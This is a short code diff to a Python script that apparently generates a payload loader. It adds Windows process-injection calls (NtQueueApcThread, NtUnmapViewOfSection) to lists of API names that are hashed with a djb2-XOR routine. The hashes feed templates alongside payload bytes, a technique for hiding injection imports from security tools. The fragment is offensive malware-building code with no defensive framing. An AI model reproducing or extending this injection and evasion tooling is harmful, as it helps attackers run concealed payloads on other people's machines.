@@ -43,10 +43,10 @@ def _get_api_hashes():
         "CreateProcessA", "VirtualAllocEx", "WriteProcessMemory", "QueueUserAPC", "ResumeThread",
         "lstrlenA", "GetEnvironmentVariableA", "VirtualProtectEx", "GetLastError",
         "NtCreateSection", "NtMapViewOfSection", "SleepEx", "NtCreateJobObject",
-        "NtSetInformationJobObject", "NtAssignProcessToJobObject",
+        "NtSetInformationJobObject", "NtAssignProcessToJobObject", "NtQueueApcThread",
         "GetComputerNameA",
         "LsaOpenPolicy", "LsaQueryInformationPolicy", "LsaFreeMemory", "LsaClose",
-        "NtQueryVirtualMemory", "NtProtectVirtualMemory"
+        "NtQueryVirtualMemory", "NtProtectVirtualMemory", "NtUnmapViewOfSection"
     ]
     module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL", "ADVAPI32.DLL"]
     
@@ -95,7 +95,7 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
             "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtCreateThreadEx", 
             "NtWaitForSingleObject", "NtCreateSection", "NtMapViewOfSection", 
             "NtWriteVirtualMemory", "NtQueueApcThread", "NtClose", "NtFreeVirtualMemory",
-            "NtQueryVirtualMemory"
+            "NtQueryVirtualMemory", "NtUnmapViewOfSection"
         ]
         for name in rg_api_names:
             template_vars[f"hash_rg_{name.lower()}"] = _djb2_hash_xor(name)
